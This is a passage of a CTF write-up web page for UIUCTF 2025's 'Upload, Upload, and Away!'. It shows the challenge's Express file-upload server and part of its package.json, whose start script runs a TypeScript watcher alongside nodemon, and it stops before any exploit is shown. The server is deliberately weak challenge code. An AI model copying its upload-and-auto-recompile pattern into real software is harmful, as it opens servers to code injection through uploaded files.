<!DOCTYPE html><!--jUDimr6wyOJvYNMJ2n6_v--><html class="dark scroll-smooth"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/94afdc017676131d.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-d11e0b30904b49ad.js"/><script src="/_next/static/chunks/4bd1b696-9911af18dede28aa.js" async=""></script><script src="/_next/static/chunks/964-2bcac1827bbf29c7.js" async=""></script><script src="/_next/static/chunks/main-app-771e5b53791411ad.js" async=""></script><script src="/_next/static/chunks/874-3e820bd666038662.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js" async=""></script><script src="/_next/static/chunks/325-655a7b8ed93161e0.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/page-bcc47f65bcf2ff4c.js" async=""></script><meta name="next-size-adjust" content=""/><title>UIUCTF 2025 — Upload, Upload, and Away! | kevin.fish</title><meta name="description" content="Keeping track of all these files makes me so dizzy I feel like I&#x27;m floating in space."/><meta property="og:title" content="UIUCTF 2025 — Upload, Upload, and Away!"/><meta property="og:description" content="Keeping track of all these files makes me so dizzy I feel like I&#x27;m floating in space."/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="UIUCTF 2025 — Upload, Upload, and Away!"/><meta name="twitter:description" content="Keeping track of all these files makes me so dizzy I feel like I&#x27;m floating in space."/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><div hidden=""><!--$--><!--/$--></div><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-4 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>UIUCTF 2025 — Upload, Upload, and Away!</h1>
<blockquote>
<p>Keeping track of all these files makes me so dizzy I feel like I&#x27;m floating in space.</p>
<p>Instancer url: <a href="https://upload-upload-and-away.chal.uiuc.tf/">https://upload-upload-and-away.chal.uiuc.tf/</a></p>
<p>Flag format: uiuctf{[a-z_]+}</p>
</blockquote>
<p>We&#x27;re given a TypeScript server that looks like this:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword module">import</span><span class=""> </span><span class="token imports">express</span><span class=""> </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&quot;express&quot;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token keyword module">import</span><span class=""> </span><span class="token imports">path</span><span class=""> </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&quot;path&quot;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword module">import</span><span class=""> </span><span class="token imports">multer</span><span class=""> </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&quot;multer&quot;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token keyword module">import</span><span class=""> </span><span class="token imports">fs</span><span class=""> </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&quot;fs&quot;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class=""></span><span class="token keyword">const</span><span class=""> app </span><span class="token operator">=</span><span class=""> </span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class=""></span><span class="token keyword">const</span><span class=""> </span><span class="token constant">PORT</span><span class=""> </span><span class="token operator">=</span><span class=""> process</span><span class="token punctuation">.</span><span class="token property-access">env</span><span class="token punctuation">.</span><span class="token constant">PORT</span><span class=""> </span><span class="token operator">||</span><span class=""> </span><span class="token number">3000</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token keyword">let</span><span class=""> fileCount </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">get</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> res</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">  res</span><span class="token punctuation">.</span><span class="token method function property-access">sendFile</span><span class="token punctuation">(</span><span class="">path</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="">__dirname</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;../public/index.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class=""> </span><span class="token comment">// paths are relative to dist/</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token keyword">const</span><span class=""> imagesDir </span><span class="token operator">=</span><span class=""> path</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="">__dirname</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;../images&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class=""></span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">fs</span><span class="token punctuation">.</span><span class="token method function property-access">existsSync</span><span class="token punctuation">(</span><span class="">imagesDir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">  fs</span><span class="token punctuation">.</span><span class="token method function property-access">mkdirSync</span><span class="token punctuation">(</span><span class="">imagesDir</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">recursive</span><span class="token operator">:</span><span class=""> </span><span class="token boolean">true</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class=""></span><span class="token keyword">const</span><span class=""> storage </span><span class="token operator">=</span><span class=""> multer</span><span class="token punctuation">.</span><span class="token method function property-access">diskStorage</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">  </span><span class="token function-variable function">destination</span><span class="token operator">:</span><span class=""> </span><span class="token keyword">function</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> file</span><span class="token parameter punctuation">,</span><span class="token parameter"> cb</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">    </span><span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword null nil">null</span><span class="token punctuation">,</span><span class=""> imagesDir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">  </span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">  </span><span class="token function-variable function">filename</span><span class="token operator">:</span><span class=""> </span><span class="token keyword">function</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> file</span><span class="token parameter punctuation">,</span><span class="token parameter"> cb</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">    </span><span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword null nil">null</span><span class="token punctuation">,</span><span class=""> path</span><span class="token punctuation">.</span><span class="token method function property-access">basename</span><span class="token punctuation">(</span><span class="">file</span><span class="token punctuation">.</span><span class="token property-access">originalname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">  </span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class=""></span><span class="token keyword">const</span><span class=""> upload </span><span class="token operator">=</span><span class=""> </span><span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class=""> storage </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">get</span><span class="token punctuation">(</span><span class="token string">&quot;/filecount&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> res</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">  res</span><span class="token punctuation">.</span><span class="token method function property-access">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">file_count</span><span class="token operator">:</span><span class=""> fileCount </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">post</span><span class="token punctuation">(</span><span class="token string">&quot;/upload&quot;</span><span class="token punctuation">,</span><span class=""> upload</span><span class="token punctuation">.</span><span class="token method function property-access">single</span><span class="token punctuation">(</span><span class="token string">&quot;file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> res</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">  </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">req</span><span class="token punctuation">.</span><span class="token property-access">file</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> res</span><span class="token punctuation">.</span><span class="token method function property-access">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token string">&quot;No file uploaded.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">  </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">  fileCount</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">  res</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token string">&quot;File uploaded successfully.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">42</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">delete</span><span class="token punctuation">(</span><span class="token string">&quot;/images&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> res</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">  </span><span class="token keyword">const</span><span class=""> imagesDir </span><span class="token operator">=</span><span class=""> path</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="">__dirname</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;../images&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">  fs</span><span class="token punctuation">.</span><span class="token method function property-access">readdir</span><span class="token punctuation">(</span><span class="">imagesDir</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token parameter punctuation">,</span><span class="token parameter"> files</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">    </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">err</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">      </span><span class="token keyword control-flow">return</span><span class=""> res</span><span class="token punctuation">.</span><span class="token method function property-access">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token string">&quot;Failed to read images directory.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">    </span><span class="token keyword">let</span><span class=""> deletePromises </span><span class="token operator">=</span><span class=""> files</span><span class="token punctuation">.</span><span class="token method function property-access">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">      fs</span><span class="token punctuation">.</span><span class="token property-access">promises</span><span class="token punctuation">.</span><span class="token method function property-access">unlink</span><span class="token punctuation">(</span><span class="">path</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="">imagesDir</span><span class="token punctuation">,</span><span class=""> file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">    </span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">    </span><span class="token known-class-name class-name">Promise</span><span class="token punctuation">.</span><span class="token method function property-access">allSettled</span><span class="token punctuation">(</span><span class="">deletePromises</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="">      </span><span class="token punctuation">.</span><span class="token method function property-access">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="">        fileCount </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">        res</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token string">&quot;All files deleted from images directory.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">56</span><span class="">      </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="">      </span><span class="token punctuation">.</span><span class="token keyword control-flow">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> res</span><span class="token punctuation">.</span><span class="token method function property-access">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token string">&quot;Failed to delete some files.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="">  </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">59</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">60</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">62</span><span class="">  </span><span class="token keyword control-flow">return</span><span class=""> </span><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">Express is listening at http://localhost:</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation constant">PORT</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">63</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">64</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">65</span><span class=""></span><span class="token keyword module">export</span><span class=""> </span><span class="token keyword">const</span><span class=""> flag </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;uiuctf{fake_flag_xxxxxxxxxxxxxxxx}&quot;</span><span class="token punctuation">;</span></code></pre></div></div>
<p>The express app exposes a few routes that let us upload files to the <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">../images</code> directory on the server, as well as query the &quot;file count&quot; tracking the number of files that have been uploaded.</p>
<p>Curiously, looking in the project <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">package.json</code>,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (json)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">  </span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;tschal&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">  </span><span class="token property">&quot;version&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;1.0.0&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">  </span><span class="token property">&quot;scripts&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token property">&quot;start&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;concurrently \&quot;tsc -w\&quot; \&quot;nodemon dist/index.js\&quot;&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">  </span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">  </span><span class="token property">&quot;keywords&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">[</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">    </span><span class="token string">&quot;i miss bun, if only there was an easier way to use typescript and nodejs :)&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">  </span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">  </span><span class="token property">&quot;author&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">  </span><span class="token property">&quot;license&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;ISC&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">  </span><span class="token property">&quot;description&quot;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="">
